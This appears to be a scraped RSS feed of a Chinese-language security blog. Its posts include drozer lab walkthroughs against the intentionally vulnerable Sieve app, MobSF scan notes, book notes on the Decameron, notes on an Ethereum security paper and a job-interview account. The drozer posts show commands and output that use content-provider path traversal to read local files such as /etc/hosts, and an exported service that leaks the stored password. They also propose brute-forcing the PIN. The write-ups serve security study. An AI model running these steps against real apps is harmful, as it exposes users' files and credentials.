&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> ParcelFileDescriptor &lt;span style="color:#a6e22e">openFile&lt;/span>(Uri uri, String mode) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> modeCode;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (mode.&lt;span style="color:#a6e22e">equals&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;r&amp;#34;&lt;/span>)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> modeCode &lt;span style="color:#f92672">=&lt;/span> 268435456;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (mode.&lt;span style="color:#a6e22e">equals&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;rw&amp;#34;&lt;/span>)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> modeCode &lt;span style="color:#f92672">=&lt;/span> 805306368;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (mode.&lt;span style="color:#a6e22e">equals&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;rwt&amp;#34;&lt;/span>)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> modeCode &lt;span style="color:#f92672">=&lt;/span> 805306368;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Log.&lt;span style="color:#a6e22e">w&lt;/span>(TAG, &lt;span style="color:#e6db74">&amp;#34;Unrecognised code to open file: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> mode);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> ParcelFileDescriptor.&lt;span style="color:#a6e22e">open&lt;/span>(&lt;span style="color:#66d9ef">new&lt;/span> File(uri.&lt;span style="color:#a6e22e">getPath&lt;/span>()), modeCode);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">catch&lt;/span> (FileNotFoundException e) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Log.&lt;span style="color:#a6e22e">e&lt;/span>(TAG, &lt;span style="color:#e6db74">&amp;#34;ERROR: unable to open file: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> e.&lt;span style="color:#a6e22e">getMessage&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>實際讀取文件或是Path Traversal
為了測試他真的能夠讀取到特定文件，我在手機的Download創了一個secret.txt，不管是哪一個file，都可以正常讀取
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ echo &lt;span style="color:#e6db74">&amp;#34;this is secret file&amp;#34;&lt;/span> &amp;gt; /storage/emulated/0/Download/secret.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/storage/emulated/0/Download/secret.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>this is secret file
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>127.0.0.1 localhost
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>::1 ip6-localhost
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>也可以利用drozer自動找尋path traversal的漏洞在哪裡
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run scanner.provider.traversal -a com.mwr.example.sieve
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanning com.mwr.example.sieve...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Not Vulnerable:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider/Keys/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider/Passwords
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider/Passwords/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider/Keys
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.DBContentProvider
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Vulnerable Providers:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.FileBackupProvider
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://com.mwr.example.sieve.FileBackupProvider/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol></description></item><item><title>Test Sieve - is debuggable</title><link>https://bernie6401.github.io/docs/tools/others/android-related/drozer/test-sieve/test-sieve---is-debuggable/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/others/android-related/drozer/test-sieve/test-sieve---is-debuggable/</guid><description>&lt;h1 id="test-sieve---is-debuggable">
 Test Sieve - is debuggable
 &lt;a class="anchor" href="#test-sieve---is-debuggable">#&lt;/a>
&lt;/h1>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.package.debuggable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Package: org.owasp.goatdroid.fourgoats
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> UID: &lt;span style="color:#ae81ff">10286&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Permissions:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - None.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Package: com.mwr.example.sieve
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> UID: &lt;span style="color:#ae81ff">10285&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Permissions:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - None.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Package: com.withsecure.dz
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> UID: &lt;span style="color:#ae81ff">10284&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Permissions:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - None.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Package: jakhar.aseem.diva
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> UID: &lt;span style="color:#ae81ff">10282&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Permissions:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - None.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Test Sieve - services exported</title><link>https://bernie6401.github.io/docs/tools/others/android-related/drozer/test-sieve/test-sieve---services-exported/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/others/android-related/drozer/test-sieve/test-sieve---services-exported/</guid><description>&lt;h1 id="test-sieve---services-exported">
 Test Sieve - services exported
 &lt;a class="anchor" href="#test-sieve---services-exported">#&lt;/a>
&lt;/h1>
&lt;ol>
&lt;li>列出exported services有哪些
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.service.info -a com.mwr.example.sieve
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Package: com.mwr.example.sieve
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> com.mwr.example.sieve.AuthService
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Permission: null
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> com.mwr.example.sieve.CryptoService
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Permission: null
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>逆向
從以上可以知道有兩個service是被export的，這樣的話就可以逆一下判斷可以送出什麼東西以及可能的漏洞在哪，按照教學的說明我直接看==AuthService==這個service，
在&lt;code>com.mwr.example.sieve.AuthService&lt;/code>中的其中一段就是有問題的地方:
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">AuthService&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> Service {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">MessageHandler&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> Handler {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">handleMessage&lt;/span>(Message msg) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">switch&lt;/span> (msg.&lt;span style="color:#a6e22e">what&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> 4:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> AuthService.&lt;span style="color:#a6e22e">MSG_CHECK&lt;/span> &lt;span style="color:#75715e">/* 2354 */&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (msg.&lt;span style="color:#a6e22e">arg1&lt;/span> &lt;span style="color:#f92672">==&lt;/span> AuthService.&lt;span style="color:#a6e22e">TYPE_KEY&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> responseCode3 &lt;span style="color:#f92672">=&lt;/span> 42;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String recievedString &lt;span style="color:#f92672">=&lt;/span> returnBundle.&lt;span style="color:#a6e22e">getString&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;com.mwr.example.sieve.PASSWORD&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (AuthService.&lt;span style="color:#a6e22e">this&lt;/span>.&lt;span style="color:#a6e22e">verifyKey&lt;/span>(recievedString)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> AuthService.&lt;span style="color:#a6e22e">this&lt;/span>.&lt;span style="color:#a6e22e">showNotification&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> returnVal2 &lt;span style="color:#f92672">=&lt;/span> 0;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> returnVal2 &lt;span style="color:#f92672">=&lt;/span> 1;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (msg.&lt;span style="color:#a6e22e">arg1&lt;/span> &lt;span style="color:#f92672">==&lt;/span> AuthService.&lt;span style="color:#a6e22e">TYPE_PIN&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> responseCode3 &lt;span style="color:#f92672">=&lt;/span> 41;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String recievedString2 &lt;span style="color:#f92672">=&lt;/span> returnBundle.&lt;span style="color:#a6e22e">getString&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;com.mwr.example.sieve.PIN&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (AuthService.&lt;span style="color:#a6e22e">this&lt;/span>.&lt;span style="color:#a6e22e">verifyPin&lt;/span>(recievedString2)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> returnBundle &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> Bundle();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> returnBundle.&lt;span style="color:#a6e22e">putString&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;com.mwr.example.sieve.PASSWORD&amp;#34;&lt;/span>, AuthService.&lt;span style="color:#a6e22e">this&lt;/span>.&lt;span style="color:#a6e22e">getKey&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> returnVal2 &lt;span style="color:#f92672">=&lt;/span> 0;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> returnVal2 &lt;span style="color:#f92672">=&lt;/span> 1;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sendUnrecognisedMessage();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sendResponseMessage(5, responseCode3, returnVal2, returnBundle);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>首先在msg.what=2354且msg.arg1=AuthService.TYPE_PIN的地方，若程式讀取到的&lt;code>com.mwr.example.sieve.PIN&lt;/code>的value(也就是PIN Code)，經過verifyPin這個function比對過後一致，則他會return一個bundle，內涵&lt;code>com.mwr.example.sieve.PASSWORD&lt;/code>以及我們之前設定的password，並且回傳response message給我們
→[5, 41, 0, {com.mwr.example.sieve.PASSWORD:&amp;lt;password&amp;gt;}]
而這個問題在哪裡呢?經過前期的確認以及逆向，我們可以寫個script爆破，不斷送出一些pin code給這個service，則因為大多時候PIN Code的複雜度比較低，所以總有一天可以得到使用者的密碼了&lt;/li>
&lt;li>和service互動
從下面的結果來看，一開始設定的密碼為==123456acitseccom==
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.service.send com.mwr.example.sieve com.mwr.example.sieve.AuthService --msg &lt;span style="color:#ae81ff">2354&lt;/span> &lt;span style="color:#ae81ff">9234&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> --extra string com.mwr.example.sieve.PIN &amp;lt;User PIN&amp;gt; --bundle-as-obj
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Got a reply from com.mwr.example.sieve/com.mwr.example.sieve.AuthService:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> what: &lt;span style="color:#ae81ff">5&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> arg1: &lt;span style="color:#ae81ff">41&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> arg2: &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Extras
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> com.mwr.example.sieve.PASSWORD &lt;span style="color:#f92672">(&lt;/span>String&lt;span style="color:#f92672">)&lt;/span> : 123456acitseccom
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol></description></item><item><title>Test Sieve by MobSF</title><link>https://bernie6401.github.io/docs/tools/others/android-related/mobsf/test-sieve-by-mobsf/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/others/android-related/mobsf/test-sieve-by-mobsf/</guid><description>&lt;h1 id="test-sieve-by-mobsf">
 Test Sieve by MobSF
 &lt;a class="anchor" href="#test-sieve-by-mobsf">#&lt;/a>
&lt;/h1>
&lt;p>這個工具真的很完整，而且蠻萬用的，光是靜態分析就很詳細&lt;/p>
&lt;h2 id="static-analysis">
 Static Analysis
 &lt;a class="anchor" href="#static-analysis">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Overview
一開始就告訴測試者有多少的東西被export，和Drozer分析的一樣
&lt;img src="https://hackmd.io/_uploads/H1oU-p3E0.png" alt="圖片" />&lt;/li>
&lt;li>Application Permission
MobSF還可以分析實際寫的code並且查看哪邊有Permission相關的威脅，在Code Analysis的地方有重複的提到External Read/Write的漏洞
&lt;img src="https://hackmd.io/_uploads/SJW6fTnV0.png" alt="圖片" />&lt;/li>
&lt;li>Manifest Analysis
這一段就很像Drozer做attack surface後的結果，也就是activity/service/broadcast receiver/content providers exported + is debuggable
&lt;ul>
&lt;li>Activity Exported
&lt;img src="https://hackmd.io/_uploads/HJZw4ahVC.png" alt="圖片" />
&lt;img src="https://hackmd.io/_uploads/HJhO4p2EA.png" alt="圖片" />&lt;/li>
&lt;li>Service Exported
&lt;img src="https://hackmd.io/_uploads/r1msNa3VR.png" alt="圖片" />
&lt;img src="https://hackmd.io/_uploads/rJXTNpnER.png" alt="圖片" />&lt;/li>
&lt;li>Content Providers Exported
&lt;img src="https://hackmd.io/_uploads/BkrR4a3NC.png" alt="圖片" />
&lt;img src="https://hackmd.io/_uploads/B1GJHa24C.png" alt="圖片" />
在Code Analysis的地方有重複的提到這個漏洞&lt;/li>
&lt;li>Debuggable
&lt;img src="https://hackmd.io/_uploads/SyObSpn4A.png" alt="圖片" />
在Code Analysis的地方有重複的提到這個漏洞&lt;/li>
&lt;li>其他
&lt;ul>
&lt;li>版本過低
&lt;img src="https://hackmd.io/_uploads/SyVkL63VC.png" alt="圖片" />&lt;/li>
&lt;li>Backupable
&lt;img src="https://hackmd.io/_uploads/B1LSvpn4A.png" alt="圖片" />&lt;/li>
&lt;li>和最近的CVE PoC分析
這個功能蠻好的，例如下圖，這三個漏洞都是去分析&lt;code>FileSelectActivity&lt;/code>/&lt;code>MainLoginActivity&lt;/code>/&lt;code>PWList&lt;/code>得出可能會有StrandHogg 2.0 或StrandHogg的問題，關於StrandHogg 2.0 的說明可以看&lt;a href="https://www.twcert.org.tw/tw/cp-104-3636-6072b-1.html">twcert的文章&lt;/a>，簡單來說這個惡意軟體的效果是常駐在各個正常執行的軟體背後，並且竊取一些機敏資料
&lt;img src="https://hackmd.io/_uploads/HJf0IpnN0.png" alt="圖片" />
&lt;img src="https://hackmd.io/_uploads/S16AL634R.png" alt="圖片" />
&lt;img src="https://hackmd.io/_uploads/H12kva34C.png" alt="圖片" />
&lt;blockquote>
&lt;p>StrandHogg 2.0 的運作原理，和去年發現的 StrandHogg 相當類似，都可在感染後將自己隱藏在正常的軟體身後；當用戶開啟正常軟體時，真正執行的並不是這個正常版的軟體，而是植入了惡意軟體程式碼的「分身」。
新版 StrandHogg 2.0 除了上述的類似功能外，還能讓惡意軟體偽裝成任意的 Android App；先前的版本只能偽裝成 TaskAffinity 這支 App，甚至能在用戶點按開啟任何 App 時立刻偽裝成該 App。&lt;/p></description></item><item><title>The Decameron (十日談)</title><link>https://bernie6401.github.io/docs/books-notes/the-decameron-%E5%8D%81%E6%97%A5%E8%AB%87/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/books-notes/the-decameron-%E5%8D%81%E6%97%A5%E8%AB%87/</guid><description>&lt;h1 id="the-decameron-十日談">
 The Decameron (十日談)
 &lt;a class="anchor" href="#the-decameron-%e5%8d%81%e6%97%a5%e8%ab%87">#&lt;/a>
&lt;/h1>
&lt;ul>
&lt;li>諷刺: 1.5, 1.8, 1.9, 1.10
&lt;ul>
&lt;li>教會: 1.1, 1.2, 1.6&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>歷史相關: 2.6&lt;/li>
&lt;li>寓言故事(利用故事達成目的): 1.3, 1.7&lt;/li>
&lt;li>聰明機制(利用計謀達成訴求或傳遞訊息): 1.4&lt;/li>
&lt;li>莫名其妙: 2.1, 2.3&lt;/li>
&lt;li>一般故事: 2.2, 2.4, 2.5&lt;/li>
&lt;/ul>
&lt;h2 id="特別吐槽">
 特別吐槽
 &lt;a class="anchor" href="#%e7%89%b9%e5%88%a5%e5%90%90%e6%a7%bd">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>1.5
那個侯爵夫人也太自戀了吧，這樣就覺得人家是專門來看自己姿色的，阿那個法王也是很身體力行，好色過頭了吧，為了看人家的老婆還千里迢迢順便去別的國家，還要想一下名目，會不會太累，阿最後的那個全部都是母雞的隱喻，還是無法完全get到，到底是三小&amp;hellip;&lt;/li>
&lt;li>1.7
史卡拉這個貴族要開宴會，很多人都去了，但他臨時取消，因此給很多人補貼，但其中他刻意不給貝加密諾這個人，也不通知他取消宴會，總之就是不爽給，而貝加密諾就直接在客棧住下來等到史卡拉願意給為止，還引經據典的說了一個故事，最後就是用嘴遁，讓史卡拉付錢
但…貝加密諾憑什麼要求史卡拉要給補償，按照故事的說法，史卡拉沒有邀請貝加密諾來參加宴會，因為貝加密諾後面引用的故事也說波里瑪索也是自願前往修道院院長家，雖然史卡拉沒有跟貝加密諾說取消宴會，但他本來就沒有邀請他去啊，是要補償什麼，整個就是一個很沒邏輯的故事…&lt;/li>
&lt;/ul></description></item><item><title>The State of Ethereum Smart Contracts Security: Vulnerabilities, Countermeasures, and Tool Support - Notes</title><link>https://bernie6401.github.io/docs/survey-papers/digital-currency/the-state-of-ethereum-smart-contracts-security_-vulnerabilities-countermeasures-and-tool-support---notes/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/survey-papers/digital-currency/the-state-of-ethereum-smart-contracts-security_-vulnerabilities-countermeasures-and-tool-support---notes/</guid><description>&lt;h1 id="the-state-of-ethereum-smart-contracts-security-vulnerabilities-countermeasures-and-tool-support---notes">
 The State of Ethereum Smart Contracts Security: Vulnerabilities, Countermeasures, and Tool Support - Notes
 &lt;a class="anchor" href="#the-state-of-ethereum-smart-contracts-security-vulnerabilities-countermeasures-and-tool-support---notes">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-meeting-paper-ntu-seminar">
 tags: &lt;code>Meeting Paper&lt;/code> &lt;code>NTU&lt;/code> &lt;code>Seminar&lt;/code>
 &lt;a class="anchor" href="#tags-meeting-paper-ntu-seminar">#&lt;/a>
&lt;/h6>
&lt;p>:::info
Zhou, H., Milani Fard, A., &amp;amp; Makanju, A. (2022). The state of ethereum smart contracts security: Vulnerabilities, countermeasures, and tool support. Journal of Cybersecurity and Privacy, 2(2), 358-378.
:::&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler &lt;a href="https://rich01.com/what-is-ether-ethereum/">以太幣(Ether) VS 以太坊(Ethereum)&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>以太坊是一個區塊鏈平台，而以太幣是裡面所使用的貨幣，智能合約的運算費用、區塊鏈上的交易手續費、礦工挖礦的獎勵等，都會用以太幣支付。&lt;/p>
&lt;p>以太坊目的是打造一個「去中心化的世界電腦」，執行的方式是透過區塊鏈技術，實現去中心化智能合約平台，以太坊和比特幣一樣具有可挖礦的公鏈系統，但多了智能合約、Dapp的技術。
:::
:::spoiler &lt;a href="https://rich01.com/what-is-smart-contract/">What is Smart Contract?&lt;/a>
智能合約是一種將雙方的協議條款，並用代碼形式在區塊鏈上運行，儲存在一個公共資料庫中，不能被更改。&lt;/p>
&lt;p>智能合約中發生的交易是由區塊鏈處理的，這意味著它們可以在沒有第三者的情況下自動執行，只有當協議中的條件得到滿足時，交易才會發生，是完全去中心化的交易。&lt;/p>&lt;/blockquote>
&lt;blockquote>
&lt;h2 id="智能合約-vs-傳統合約">
 智能合約 VS 傳統合約
 &lt;a class="anchor" href="#%e6%99%ba%e8%83%bd%e5%90%88%e7%b4%84-vs-%e5%82%b3%e7%b5%b1%e5%90%88%e7%b4%84">#&lt;/a>
&lt;/h2>
&lt;p>&lt;img src="https://rich01.com/wp-content/uploads/20210917180100_80.jpg" alt="" />&lt;/p></description></item><item><title>Trapa Interview</title><link>https://bernie6401.github.io/docs/job/interview/trapa-interview/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/job/interview/trapa-interview/</guid><description>&lt;h1 id="trapa-interview">
 Trapa Interview
 &lt;a class="anchor" href="#trapa-interview">#&lt;/a>
&lt;/h1>
&lt;h2 id="面試流程">
 面試流程
 &lt;a class="anchor" href="#%e9%9d%a2%e8%a9%a6%e6%b5%81%e7%a8%8b">#&lt;/a>
&lt;/h2>
&lt;h3 id="一面">
 一面
 &lt;a class="anchor" href="#%e4%b8%80%e9%9d%a2">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>(1HR)一面主要是&lt;a href="https://twitter.com/0xddaa">ddaa&lt;/a>主面，人非常的好也很願意給我建議和修正的地方，一開始主要針對公司在開發的平台以及整體公司現況做簡單的說明，接著就直接進到自我介紹，完了之後開始針對自我介紹的內容做非&lt;del>常&lt;/del>詳細的詢問，諸如目前實習的地方主要是在幹麻、開發的東西是什麼、IPS和Firewall的品牌是什麼之類的(因為我主要是針對公司內部開發一個防火牆的整合系統所以會被問這個東西)，還有針對我寫的各種文章、藍隊的題目靶機(BTLO、Cyberdefenders)有沒有印象深刻的題目、以及針對比賽的經驗、有沒有什麼特別令人印象深刻的地方或是題目是很有成就感的(因為我跟他說參加過去年和今年的EOF，所以針對決賽的A&amp;amp;D以及KoH會比較多問題)等等，總之這一段我個人認為就是閒聊，主要了解我的個人經歷以及目前的經驗到哪裡，但是還是那句老話，自己的經驗有多少寫多少，不要不是自己做的也寫上去，不然被問爆就會露出馬腳&lt;/p>
